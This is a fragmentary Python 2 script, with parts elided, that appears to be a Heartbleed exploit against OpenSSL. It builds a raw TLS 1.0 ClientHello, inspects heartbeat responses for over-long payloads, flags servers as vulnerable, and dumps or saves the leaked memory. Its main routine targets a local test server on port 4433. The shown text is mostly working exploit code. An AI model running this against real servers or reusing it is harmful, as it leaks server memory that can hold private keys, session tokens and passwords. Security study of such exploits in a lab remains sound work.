...
tls_versions = {0x01:'TLSv1.0'}

def build_client_hello(tls_ver):
    # Obtained by running:
    # openssl s_client -connect localhost:4433 -debug -tls1 -cipher AES128-SHA -msg

    return [
        # >>> ??? [length 0005]
        0x16, 0x03, 0x01, 0x00, 0x3d,
        # >>> TLS 1.0, Handshake [length 003d], ClientHello
        0x01, 0x00, 0x00, 0x39, 0x03, 0x01, 0x23, 0xad, 0xaf, 0x97, 0xb5, 0x63,
        0x5d, 0xbf, 0xa2, 0xcb, 0xda, 0x08, 0x59, 0xaa, 0xc9, 0x7d, 0x06, 0xee,
        0xbe, 0xa7, 0xea, 0xa3, 0xd2, 0xa4, 0x34, 0x9e, 0xc5, 0x25, 0x47, 0xe2,
        0x2a, 0x99, 0x00, 0x00, 0x04, 0x00, 0x2f, 0x00, 0xff, 0x01, 0x00, 0x00,
        0x0c, 0x00, 0x23, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x17, 0x00,
        0x00
    ]
        ...
        if typ == 24:
            ...
            if len(pay) > 3:
                if firstrun or opts.verbose:
                    print '\nWARNING: ' + targ + ':' + str(opts.port) + ' returned more data than it should - server is vulnerable! ' + str(len(pay))
                if opts.rawoutfile:
                    rawfileOUT.write(pay)
                if False: # opts.extractkey:
                	return pay
                else:
	                return hexdump(pay)
            else:
...
HOST, PORT = '', 4433
# https://stackoverflow.com/a/26851670
def victim_request():
    # SET VARIABLES
...
def main():
    victim_request()
    # victim_request()
    allresults = bleed(HOST, PORT)
    print '%d: %s' % (len(allresults), allresults)
